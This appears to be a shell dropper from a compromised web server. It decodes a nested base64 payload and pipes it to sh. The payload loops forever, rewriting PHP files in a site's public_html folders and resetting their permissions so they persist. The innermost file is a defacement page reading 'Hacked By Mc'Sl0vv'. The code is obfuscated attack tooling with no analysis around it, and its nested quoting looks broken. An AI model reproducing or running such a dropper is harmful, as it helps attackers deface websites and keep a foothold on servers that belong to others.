miuae="dirnya="/home/nerspediaulmac/public_html/templates/submission/form/"
datanya="ZGlybnlhPSIvaG9tZS9uZXJzcGVkaWF1bG1hYy9wdWJsaWNfaHRtbC9kb2NzL21hbnVhbC9hci9zZXR0aW5ncy8iCmRhdGFueWE9IlBDRmtiMk4wZVhCbElHaDBiV3crQ2p4b2RHMXNJR3hoYm1jOUltVnVJajRLSUNBZ0lEeG9aV0ZrUGdvZ0lDQWdJQ0FnSUR4MGFYUnNaVDVJWVdOclpXUWdRbmtnVFdNblUyd3dkblk4TDNScGRHeGxQZ29nSUNBZ0lDQWdJRHh0WlhSaElHNWhiV1U5SW1SbGMyTnlhWEIwYVc5dUlpQmpiMjUwWlc1MFBTSkNaU0JqWVhKbFpuVnNJRzl1SUdsdWRHVnlibVYwTENCMGFHVnlaU2R6SUc1dklIUm9hVzVuSUdOaGJHeGxaQ0J3Y21sMllXTjVJR2hsY21VaVBnb2dJQ0FnSUNBZ0lEeHRaWFJoSUc1aGJXVTlJbXRsZVhkdmNtUWlJR052Ym5SbGJuUTlJazFqSjFOc01IWjJMQ0JvWVdOclpYSXNJR2xrYVc5MElHSnNZV05yYUdGMExDQmhibTl1YzJWakxDQnBibVpwYm1sMGVTQmplV0psY2lCMFpXRnRMQ0JxWVd0aGNuUmhJR0pzWVdOcmFHRjBMQ0krQ2lBZ0lDQWdJQ0FnUEcxbGRHRWdjSEp2Y0dWeWRIazlJbTluT21sdFlXZGxJaUJqYjI1MFpXNTBQU0pvZEhSd2N6b3ZMM04wWVhScFl5NTJaV04wWldWNmVTNWpiMjB2YzNsemRHVnRMM0psYzI5MWNtTmxjeTl3Y21WMmFXVjNjeTh3TURJdk5EZ3pMemt4T1M5dWIyNWZNbmd2YjI1cExXMWhjMnN0WVhKMGQyOXlheTEyWldOMGIzSXVhbkJuSWo0S0lDQWdJQ0FnSUNBOGJXVjBZU0J1WVcxbFBTSm5iMjluYkdVaUlHTnZiblJsYm5ROUltNXZkSEpoYm5Oc1lYUmxJajRLSUNBZ0lDQWdJQ0E4YldWMFlTQnVZVzFsUFNKeWIySnZkSE1pSUdOdmJuUmxiblE5SW1sdVpHVjRMQ0JtYjJ4c2IzY2lJQzgrQ2lBZ0lDQWdJQ0FnUEcxbGRHRWdibUZ0WlQwaVlYVjBhRzl5SWlCamIyNTBaVzUwUFNKTll5ZFRiREIyZGlJK0NpQWdJQ0FnSUNBZ1BHeHBibXNnY21Wc1BTSnphRzl5ZEdOMWRDQnBZMjl1SWlCb2NtVm1QU0pvZEhSd2N6b3ZMM2wwTXk1blozQm9kQzVqYjIwdmVYUmpMMEZMWldSUFRGSTVWVVp5Wmt4aE0zUjVMVUpZWmpWMU9HRTNXbVk0TFdJNE1WbGtPR2x3ZURBeGIyNWtWMmM5Y3prd01DMWpMV3N0WXpCNE1EQm1abVptWm1ZdGJtOHRjbW9pUGdvZ0lDQWdJQ0FnSUR4c2FXNXJJSEpsYkQwaWNISmxZMjl1Ym1WamRDSWdhSEpsWmowaWFIUjBjSE02THk5bWIyNTBjeTVuYjI5bmJHVmhjR2x6TG1OdmJTSStDaUFnSUNBZ0lDQWdQR3hwYm1zZ2NtVnNQU0p3Y21WamIyNXVaV04wSWlCb2NtVm1QU0pvZEhSd2N6b3ZMMlp2Ym5SekxtZHpkR0YwYVdNdVkyOXRJaUJqY205emMyOXlhV2RwYmo0S0lDQWdJQ0FnSUNBOGJHbHVheUJvY21WbVBTSm9kSFJ3Y3pvdkwyWnZiblJ6TG1kdmIyZHNaV0Z3YVhNdVkyOXRMMk56Y3pJL1ptRnRhV3g1UFZWaWRXNTBkU3ROYjI1dk9tbDBZV3hBTVNaa2FYTndiR0Y1UFhOM1lYQWlJSEpsYkQwaWMzUjViR1Z6YUdWbGRDSStDaUFnSUNBOEwyaGxZV1ErQ2lBZ0lDQThjM1I1YkdVK0NpQWdJQ0FnSUNBZ2FIUnRiSHNLSUNBZ0lDQWdJQ0FnSUNBZ1ltRmphMmR5YjNWdVpDMWpiMnh2Y2pvZ1lteGhZMnM3Q2lBZ0lDQWdJQ0FnSUNBZ0lHTnZiRzl5T25kb2FYUmxPd29nSUNBZ0lDQWdJQ0FnSUNCMFpYaDBMV0ZzYVdkdU9tTmxiblJsY2pzS0lDQWdJQ0FnSUNBZ0lDQWdZV3hwWjI0NlkyVnVkR1Z5T3dvZ0lDQWdJQ0FnSUNBZ0lDQm1iMjUwTFdaaGJXbHNlVG9nSjFWaWRXNTBkU0JOYjI1dkp5d2diVzl1YjNOd1lXTmxPd29nSUNBZ0lDQWdJQ0FnSUNCbWIyNTBMWE5wZW1VNklESXdjSGc3Q2lBZ0lDQWdJQ0FnSUNBZ0lHUnBjM0JzWVhrNlpteGxlRHNLSUNBZ0lDQWdJQ0FnSUNBZ1pteGxlQzFrYVhKbFkzUnBiMjQ2WTI5c2RXMXVPd29nSUNBZ0lDQWdJQ0FnSUNCcWRYTjBhV1o1TFdOdmJuUmxiblE2WTJWdWRHVnlPd29nSUNBZ0lDQWdJQ0FnSUNCdGFXNHRhR1ZwWjJoME9qRXdNSFpvT3dvZ0lDQWdJQ0FnSUgwS0lDQWdJQ0FnSUNCeVpXUjdZMjlzYjNJNmNtVmtPMzBLSUNBZ0lDQWdJQ0J0WlhOellXZGxld29nSUNBZ0lDQWdJQ0FnSUNCbWIyNTBMWE5wZW1VNk1UZHdlRHNLSUNBZ0lDQWdJQ0FnSUNBZ2RHVjRkQzFrWldOdmNtRjBhVzl1T2lCMWJtUmxjbXhwYm1VN0NpQWdJQ0FnSUNBZ2ZRb2dJQ0FnSUNBZ0lDNWxjbkp2Y2lCN0NpQWdJQ0FnSUNBZ0lDQWdJSFJsZUhRdFlXeHBaMjQ2SUdObGJuUmxjanNLSUNBZ0lDQWdJQ0FnSUNBZ1ptOXVkQzFtWVcxcGJIazZJQ2RWWW5WdWRIVWdUVzl1Ynljc0lHMXZibTl6Y0dGalpUc0tJQ0FnSUNBZ0lDQWdJQ0FnTFhkbFltdHBkQzFoYm1sdFlYUnBiMjQ2SUc1dmFYTmxMVE1nTVhNZ2JHbHVaV0Z5SUdsdVptbHVhWFJsT3dvZ0lDQWdJQ0FnSUNBZ0lDQmhibWx0WVhScGIyNDZJRzV2YVhObExUTWdNWE1nYkdsdVpXRnlJR2x1Wm1sdWFYUmxPd29nSUNBZ0lDQWdJQ0FnSUNCdmRtVnlabXh2ZHpvZ1pHVm1ZWFZzZERzS0lDQWdJQ0FnSUNCOUNpQWdJQ0FnSUNBZ0xtbHVabThnZXdvZ0lDQWdJQ0FnSUNBZ0lDQjBaWGgwTFdGc2FXZHVPaUJqWlc1MFpYSTdDaUFnSUNBZ0lDQWdJQ0FnSUhkcFpIUm9PaUF5TURCd2VEc0tJQ0FnSUNBZ0lDQWdJQ0FnYUdWcFoyaDBPaUEyTUhCNE93b2dJQ0FnSUNBZ0lDQWdJQ0J0WVhKbmFXNDZJR0YxZEc4N0NpQWdJQ0FnSUNBZ0lDQWdJSEJ2YzJsMGFXOXVPaUJoWW5OdmJIVjBaVHNLSUNBZ0lDQWdJQ0FnSUNBZ2RHOXdPaUF5T0RCd2VEc0tJQ0FnSUNBZ0lDQWdJQ0FnWW05MGRHOXRPaUF3T3dvZ0lDQWdJQ0FnSUNBZ0lDQnNaV1owT2lBeU1IQjRPd29nSUNBZ0lDQWdJQ0FnSUNCeWFXZG9kRG9nTURzS0lDQWdJQ0FnSUNBZ0lDQWdMWGRsWW10cGRDMWhibWx0WVhScGIyNDZJRzV2YVhObExUTWdNWE1nYkdsdVpXRnlJR2x1Wm1sdWFYUmxPd29nSUNBZ0lDQWdJQ0FnSUNCaGJtbHRZWFJwYjI0NklHNXZhWE5sTFRNZ01YTWdiR2x1WldGeUlHbHVabWx1YVhSbE93b2dJQ0FnSUNBZ0lIMEtJQ0FnSUNBZ0lDQXVhVzVtYnpwaFpuUmxjaUI3Q2lBZ0lDQWdJQ0FnSUNBZ0lHTnZiblJsYm5RNklDZFBWMDVGUkNjN0lHWnZiblF0Wm1GdGFXeDVPaUJQUTFJdFFUc2dabTl1ZEMxemFYcGxPaUF4TURCd2VEc2dkR1Y0ZEMxaGJHbG5iam9nWTJWdWRHVnlPeUIzYVdSMGFEb2dPREF3Y0hnN0lHMWhjbWRwYmpvZ1lYVjBienNnY0c5emFYUnBiMjQ2SUdGaWMyOXNkWFJsT3lCMGIzQTZJREl3Y0hnN0lHSnZkSFJ2YlRvZ01Ec2diR1ZtZERvZ05EQndlRHNnY21sbmFIUTZJREE3SUc5d1lXTnBkSGs2SURBN0lHTnZiRzl5T2lCM2FHbDBaVHNnTFhkbFltdHBkQzFoYm1sdFlYUnBiMjQ2SUc1dmFYTmxMVEVnTGpKeklHeHBibVZoY2lCcGJtWnBibWwwWlRzZ1lXNXBiV0YwYVc5dU9pQnViMmx6WlMweElDNHljeUJzYVc1bFlYSWdhVzVtYVc1cGRHVTdJSDBnUUMxM1pXSnJhWFF0YTJWNVpuSmhiV1Z6SUc1dmFYTmxMVEVnZXlBd0pTd2dNakFsTENBME1DVXNJRFl3SlN3Z056QWxMQ0E1TUNVZ2UyOXdZV05wZEhrNklEQTdmU0F4TUNVZ2UyOXdZV05wZEhrNklDNHhPMzBnTlRBbElIdHZjR0ZqYVhSNU9pQXVOVHNnYkdWbWREb2dMVFp3ZUR0OUlEZ3dKU0I3YjNCaFkybDBlVG9nTGpNN2ZTQXhNREFsSUh0dmNHRmphWFI1T2lBdU5qc2diR1ZtZERvZ01uQjRPMzBnZlNCQWEyVjVabkpoYldWeklHNXZhWE5sTFRFZ2V5QXdKU3dnTWpBbExDQTBNQ1VzSURZd0pTd2dOekFsTENBNU1DVWdlMjl3WVdOcGRIazZJREE3ZlNBeE1DVWdlMjl3WVdOcGRIazZJQzR4TzMwZ05UQWxJSHR2Y0dGamFYUjVPaUF1TlRzZ2JHVm1kRG9nTFRad2VEdDlJRGd3SlNCN2IzQmhZMmwwZVRvZ0xqTTdmU0F4TURBbElIdHZjR0ZqYVhSNU9pQXVOanNnYkdWbWREb2dNbkI0TzMwZ2ZTQkFMWGRsWW10cGRDMXJaWGxtY21GdFpYTWdibTlwYzJVdE1pQjdJREFsTENBeU1DVXNJRFF3SlN3Z05qQWxMQ0EzTUNVc0lEa3dKU0I3YjNCaFkybDBlVG9nTUR0OUlERXdKU0I3YjNCaFkybDBlVG9nTGpFN2ZTQTFNQ1VnZTI5d1lXTnBkSGs2SUM0MU95QnNaV1owT2lBMmNIZzdmU0E0TUNVZ2UyOXdZV05wZEhrNklDNHpPMzBnTVRBd0pTQjdiM0JoWTJsMGVUb2dMalk3SUd4bFpuUTZJQzB5Y0hnN2ZTQjlJRUJyWlhsbWNtRnRaWE1nYm05cGMyVXRNaUI3SURBbExDQXlNQ1VzSURRd0pTd2dOakFsTENBM01DVXNJRGt3SlNCN2IzQmhZMmwwZVRvZ01EdDlJREV3SlNCN2IzQmhZMmwwZVRvZ0xqRTdmU0ExTUNVZ2UyOXdZV05wZEhrNklDNDFPeUJzWldaME9pQTJjSGc3ZlNBNE1DVWdlMjl3WVdOcGRIazZJQzR6TzMwZ01UQXdKU0I3YjNCaFkybDBlVG9nTGpZN0lHeGxablE2SUMweWNIZzdmU0I5SUVBdGQyVmlhMmwwTFd0bGVXWnlZVzFsY3lCdWIybHpaU0I3SURBbExDQXpKU3dnTlNVc0lEUXlKU3dnTkRRbExDQXhNREFsSUh0dmNHRmphWFI1T2lBeE95QXRkMlZpYTJsMExYUnlZVzV6Wm05eWJUb2djMk5oYkdWWktERXBPeUIwY21GdWMyWnZjbTA2SUhOallXeGxXU2d4S1R0OUlEUXVNeVVnZTI5d1lXTnBkSGs2SURFN0lDMTNaV0pyYVhRdGRISmhibk5tYjNKdE9pQnpZMkZzWlZrb01TNDNLVHNnZEhKaGJuTm1iM0p0T2lCelkyRnNaVmtvTVM0M0tUdDlJRFF6SlNCN2IzQmhZMmwwZVRvZ01Uc2dMWGRsWW10cGRDMTBjbUZ1YzJadmNtMDZJSE5qWVd4bFdDZ3hMalVwT3lCMGNtRnVjMlp2Y20wNklITmpZV3hsV0NneExqVXBPMzBnZlNCQWEyVjVabkpoYldWeklHNXZhWE5sSUhzZ01DVXNJRE1sTENBMUpTd2dORElsTENBME5DVXNJREV3TUNVZ2UyOXdZV05wZEhrNklERTdJQzEzWldKcmFYUXRkSEpoYm5ObWIzSnRPaUJ6WTJGc1pWa29NU2s3SUhSeVlXNXpabTl5YlRvZ2MyTmhiR1ZaS0RFcE8zMGdOQzR6SlNCN2IzQmhZMmwwZVRvZ01Uc2dMWGRsWW10cGRDMTBjbUZ1YzJadmNtMDZJSE5qWVd4bFdTZ3hMamNwT3lCMGNtRnVjMlp2Y20wNklITmpZV3hsV1NneExqY3BPMzBnTkRNbElIdHZjR0ZqYVhSNU9pQXhPeUF0ZDJWaWEybDBMWFJ5WVc1elptOXliVG9nYzJOaGJHVllLREV1TlNrN0lIUnlZVzV6Wm05eWJUb2djMk5oYkdWWUtERXVOU2s3ZlNCOUlFQXRkMlZpYTJsMExXdGxlV1p5WVcxbGN5QnViMmx6WlMweklIc2dNQ1VzTXlVc05TVXNORElsTERRMEpTd3hNREFsSUh0dmNHRmphWFI1T2lBeE95QXRkMlZpYTJsMExYUnlZVzV6Wm05eWJUb2djMk5oYkdWWktERXBPeUIwY21GdWMyWnZjbTA2SUhOallXeGxXU2d4S1R0OUlEUXVNeVVnZTI5d1lXTnBkSGs2SURFN0lDMTNaV0pyYVhRdGRISmhibk5tYjNKdE9pQnpZMkZzWlZrb05DazdJSFJ5WVc1elptOXliVG9nYzJOaGJHVlpLRFFwTzMwZ05ETWxJSHR2Y0dGamFYUjVPaUF4T3lBdGQyVmlhMmwwTFhSeVlXNXpabTl5YlRvZ2MyTmhiR1ZZS0RFd0tTQnliM1JoZEdVb05qQmtaV2NwT3lCMGNtRnVjMlp2Y20wNklITmpZV3hsV0NneE1Da2djbTkwWVhSbElDZzJNR1JsWnlrN2ZTQjlJRUJyWlhsbWNtRnRaWE1nYm05cGMyVXRNeUI3SURBbExETWxMRFVsTERReUpTdzBOQ1VzTVRBd0pTQjdiM0JoWTJsMGVUb2dNVHNnTFhkbFltdHBkQzEwY21GdWMyWnZjbTA2SUhOallXeGxXU2d4S1RzZ2RISmhibk5tYjNKdE9pQnpZMkZzWlZrb01TazdmU0EwTGpNbElIdHZjR0ZqYVhSNU9pQXhPeUF0ZDJWaWEybDBMWFJ5WVc1elptOXliVG9nYzJOaGJHVlpLRFFwT3lCMGNtRnVjMlp2Y20wNklITmpZV3hsV1NnMEtUdDlJRFF6SlNCN2IzQmhZMmwwZVRvZ01Uc2dMWGRsWW10cGRDMTBjbUZ1YzJadmNtMDZJSE5qWVd4bFdDZ3hNQ2tnY205MFlYUmxLRFl3WkdWbktUc2dkSEpoYm5ObWIzSnRPaUJ6WTJGc1pWZ29NVEFwSUhKdmRHRjBaU0FvTmpCa1pXY3BPMzBnZlNBdWQzSmhjQ0I3SUhSdmNEb2dNekFsT3lCc1pXWjBPaUF5TlNVN0lHaGxhV2RvZERvZ01qQXdjSGc3SUcxaGNtZHBiaTEwYjNBNklDMHhNREJ3ZURzZ2NHOXphWFJwYjI0NklHRmljMjlzZFhSbE95QjlJR052WkdVZ2V5QmpiMnh2Y2pvZ2QyaHBkR1U3SUgwZ2MzQmhiaTVpYkhWbElIc2dZMjlzYjNJNklDTTBPR0psWldZN0lIMGdjM0JoYmk1amIyMXRaVzUwSUhzZ1kyOXNiM0k2SUNNM1pqaGpPR1E3SUgwZ2MzQmhiaTV2Y21GdVoyVWdleUJqYjJ4dmNqb2dJMll6T1dNeE1qc2dmU0J6Y0dGdUxtZHlaV1Z1SUhzZ1kyOXNiM0k2SUNNek0yTmpNek03SUgwZ0xuWnBaWGRHZFd4c0lIc2dabTl1ZEMxbVlXMXBiSGs2VDBOU0xVRTdJR052Ykc5eU9tOXlZVzVuWlRzZ2RHVjRkQzFrWldOdmNtRjBhVzl1T2pzZ2ZTQjlJRUJ0WldScFlTQnZibXg1SUhOamNtVmxiaUJoYm1RZ0tHMXBiaTFvWldsbmFIUTZJRFV3TUhCNEtTQjdJQzUyYVdWM1JuVnNiSHNnWkdsemNHeGhlVHB1YjI1bE95QjlJSDBnUEM5emRIbHNaVDRnUEdObGJuUmxjajRnUEhOMGVXeGxQaUJwYldjZ2V5Qm1hV3gwWlhJNllXeHdhR0VvYjNCaFkybDBlVDAzTUNrN0lDMXRiM290YjNCaFkybDBlVG93TGpjN0lHOXdZV05wZEhrNk1DNDNPeUI5SUdsdFp6cG9iM1psY2lCN0lHWnBiSFJsY2pwaGJIQm9ZU2h2Y0dGamFYUjVQVEV3TUNrN0lDMXRiM290YjNCaFkybDBlVG91TURzZ2IzQmhZMmwwZVRveExqQTdJSDBLQ2lBZ0lDQThMM04wZVd4bFBnb2dJQ0FnUEdKdlpIaytQR1JwZGlCamJHRnpjejBpWlhKeWIzSWlQZ29nSUNBZ0lDQWdJRHhqWlc1MFpYSStDaUFnSUNBZ0lDQWdJQ0FnSUR4cGJXY2djM0pqUFNKb2RIUndjem92TDJsamFHVm1MbUppWTJrdVkyOHVkV3N2Ym1WM2N5ODBOalF2YldOekwyMWxaR2xoTDJsdFlXZGxjeTgzTVRRM05UQXdNQzlxY0djdlh6Y3hORGMxTWpVMlgyTnNiM2R1TG1wd1p5SWdkMmxrZEdnOUlqTXdNSEI0SWo0S0lDQWdJQ0FnSUNBOEwyTmxiblJsY2o0S0lDQWdJQ0FnSUNBOFluSStTR0ZqYTJWa0lFSjVJRTFqSjFOc01IWjJJRHhpY2o0OFluSStQRzFsYzNOaFoyVStQSEpsWkQ0aVBDOXlaV1ErVjJVZ1kyRnVibTkwSUhOdmJIWmxJRzkxY2lCd2NtOWliR1Z0Y3lCM2FYUm9JSFJvWlNCellXMWxJSFJvYVc1cmFXNW5JSGRsSUhWelpXUWdkMmhsYmlCM1pTQmpjbVZoZEdWa0lIUm9aVzB1UEhKbFpENGlQQzl5WldRK1BDOXRaWE56WVdkbFBnb2dJQ0FnSUNBZ0lEeGljajQ4WW5JK2ZpQkhVa1ZGVkVsT1J5QitQR0p5UG5KcGVtdGZhR0Y0TUhJZ0xTQTBURTB3TlZSSU0xWWhUQ0F0SUUxeUxrUnZiblYwSjNNZ0xTQlFiMmh2YmxOaFozVWdMU0JDYUdWaGNuUXlNaUF0SUM0dlFrVTJORXdnTFNCTmNpNURZV3RwYkNBdElFRjBaVzVuTXpNM0lDMGdXbUZyVTJWak1UWTJJQzBnTGk5VFlXTm9hV2tuV0hCc2IybDBJQzBnUm1Wc2JFZGhibk04WW5JK1BHSnlQZ29nSUNBZ0lDQWdJRHh0WVhKeGRXVmxJSE4wZVd4bFBTSmpiMnh2Y2pwM2FHbDBaVHRtYjI1MExXWmhiV2xzZVRvZ0oxVmlkVzUwZFNCTmIyNXZKeXdnYlc5dWIzTndZV05sT3lCbWIyNTBMWE5wZW1VNklERTVjSGc3SWlCM2FXUjBhRDBpTkRnbElpQnpZM0p2Ykd4a1pXeGhlVDBpTVNJZ2MyTnliMnhzWVcxdmRXNTBQU0k0SWo0Z1NXUnBiM1FnUW14aFkydElZWFFnTFNCS1lXdGhjblJoSUVKc1lXTnJTR0YwSUMwZ1UyOXliMjVuTm1WMFlYSWdMU0E1T1hONWJtUnBZMkYwWlNBdElFbHVabWx1YVhSNUlFTjVZbVZ5SUZSbFlXMGdMU0JCYm1GeVkyaHZXSEJzYjJsMElDMGdTV1JwYjNRZ1FteGhZMnRJWVhRZ0xTQkJibTl1VTJWaklGUmxZVzBnTFNCS1lXdGhjblJoSUVONVltVnlJRlJsWVcwZ0xTQkNiR0ZqYTBoaGRDQklZV05yWlhJZ1NXNWtiMjVsYzJsaElDMGdUV0Z1ZFhOcFlTQkNhV0Z6WVNCVVpXRnRQQzl0WVhKeGRXVmxQZ29nSUNBZ0lDQWdJRHd2WkdsMlBnb2dJQ0FnSUNBZ0lEeGhkV1JwYnlCemRIbHNaVDBpWkdsemNHeGhlVHB1YjI1bE95SWdZMjl1ZEhKdmJITWdZWFYwYjNCc1lYaytDaUFnSUNBZ0lDQWdJQ0FnSUR4emIzVnlZMlVnYzNKalBTSm9kSFJ3Y3pvdkwzZDNkeTV0WW05NFpISnBkbVV1WTI5dEwwdDFiRzhtSXpNeU8zQjFiaVlqTXpJN1FXNW5hMkYwSmlNek1qdFVZVzVuWVc0bUl6TXlPMVJ2Y0NZak16STdkRzl3WVc0bUl6TXlPME52ZG1WeUppTXpNanRTYVcxaEppTXpNanRHWVdGZk1EQmZNREpmTkRFdE1EQmZNRE5mTWpZbUl6TXlPeTBtSXpNeU8yOUViM2R1Ykc5aFpHVnlMbTF3TXlJZ2RIbHdaVDBpWVhWa2FXOHZiWEF6SWo0S0lDQWdJQ0FnSUNBZ0lEd3ZZWFZrYVc4K0NpQWdJQ0FnSUNBZ1BDOWliMlI1UGdvZ0lDQWdJQ0FnSUR3dlkyVnVkR1Z5UGp3dmFIUnRiRDQ9Igp3aGlsZSB0cnVlOyBkbyAKICAgICAgICBlY2hvICRkYXRhbnlhIHwgYmFzZTY0IC1kID4gJGRpcm55YS9rb250b2xtZW55YWxhbmcucGhwCiAgICAgICAgbWtkaXIgLXAgJGRpcm55YS8KCWNobW9kIDA2NDQgJGRpcm55YS8KICAgICAgICBjaG1vZCAwNzU1ICRkaXJueWEvCiAgICAgICAgc2xlZXAgMC41CmRvbmU="
while true; do 
        echo $datanya | base64 -d > $dirnya/checkers.php
        mkdir -p $dirnya/
	chmod 0644 $dirnya/
        chmod 0755 $dirnya/
        sleep 0.5
done"
echo $miuae | base64 -d | sh
